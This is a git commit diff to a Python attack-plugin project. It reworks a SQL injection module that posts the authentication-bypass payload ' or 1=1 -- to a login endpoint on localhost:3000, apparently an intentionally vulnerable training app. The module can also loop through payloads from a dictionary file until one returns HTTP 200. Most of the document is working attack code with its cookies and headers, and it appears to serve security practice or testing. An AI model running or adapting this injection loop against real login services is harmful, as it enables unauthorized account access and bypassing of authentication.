0a434392805b73227b1721f6ef5827a2d802f8cf
hughsong <hugh.happy.everyday@gmail.com>
2022-10-25 20:10:43 -0400

    1.separate cookie and header part into a config file;  2. SQL inject could read payload from a file;   3. extract success status from responds of POST packets

--- plugins/SQL_injection.py
+++ plugins/SQL_injection.py
@@ -1,46 +1,40 @@
 from . import attack as a
+from .header_config import *
 
 class SQL_injector(a.attack_inter):
-    def init(self):
-        print("init")
+    def __init__(self, dictionary=None):
+        self.dictionary = dictionary
 
-    def generator(self):
-        cookies = {
-            'language': 'en',
-            'continueCode': 'KlBmaq4Ln5XE63vDGljh4t8HKTriaS7HnyfpgC3qs71Ap29bWRw7Zyk8o1VP',
-            'welcomebanner_status': 'dismiss',
-            'cookieconsent_status': 'dismiss',
-        }
 
-        headers = {
-            'Host': 'localhost:3000',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.5',
-            # 'Accept-Encoding': 'gzip, deflate',
-            # Already added when you pass json=
-            # 'Content-Type': 'application/json',
-            # 'Content-Length': '40',
-            'Origin': 'http://localhost:3000',
-            'Connection': 'close',
-            'Referer': 'http://localhost:3000/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-            # Requests sorts cookies= alphabetically
-            # 'Cookie': 'language=en; continueCode=KlBmaq4Ln5XE63vDGljh4t8HKTriaS7HnyfpgC3qs71Ap29bWRw7Zyk8o1VP; welcomebanner_status=dismiss; cookieconsent_status=dismiss',
-        }
+    def generator(self, myScript='\' or 1=1 --'):
+        cookies = COOKIE
+
+        headers = HEADER
 
         json_data = {
-            'email': '\' or 1=1 --',
+            'email': myScript,
             'password': '123',
         }
 
         return cookies, headers, json_data
 
     def run(self):
-        cookies, headers, json_data = self.generator()
-
-        response = a.requests.post('http://localhost:3000/rest/user/login', cookies=cookies, headers=headers, json=json_data, verify=False)
-        
-        print(response.json())
+        if self.dictionary:
+            f = open(self.dictionary, "r")
+            for line in f:
+                line = line.rstrip()
+                cookies, headers, json_data = self.generator(line)
+                response = a.requests.post('http://localhost:3000/rest/user/login', cookies=cookies, headers=headers, json=json_data, verify=False)
+                if response.status_code == 200:
+                    res_payload_dict = response.json()
+                    print("Valid script: ", json_data['email'])
+                    print(res_payload_dict)
+                    break
+        else:
+            cookies, headers, json_data = self.generator()
+            response = a.requests.post('http://localhost:3000/rest/user/login', cookies=cookies, headers=headers, json=json_data, verify=False)
+            if response.status_code == 200:
+                res_payload_dict = response.json()
+                print("Valid script: ", json_data['email'])
+                print(res_payload_dict)
+            
---
+++ plugins/header_config.py
@@ -0,0 +1,25 @@
+COOKIE = {
+            'language': 'en',
+            'continueCode': 'KlBmaq4Ln5XE63vDGljh4t8HKTriaS7HnyfpgC3qs71Ap29bWRw7Zyk8o1VP',
+            'welcomebanner_status': 'dismiss',
+            'cookieconsent_status': 'dismiss',
+        }
+
+HEADER = {
+    'Host': 'localhost:3000',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'en-US,en;q=0.5',
+    # 'Accept-Encoding': 'gzip, deflate',
+    # Already added when you pass json=
+    # 'Content-Type': 'application/json',
+    # 'Content-Length': '40',
+    'Origin': 'http://localhost:3000',
+    'Connection': 'close',
+    'Referer': 'http://localhost:3000/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    # Requests sorts cookies= alphabetically
+    # 'Cookie': 'language=en; continueCode=KlBmaq4Ln5XE63vDGljh4t8HKTriaS7HnyfpgC3qs71Ap29bWRw7Zyk8o1VP; welcomebanner_status=dismiss; cookieconsent_status=dismiss',
+}
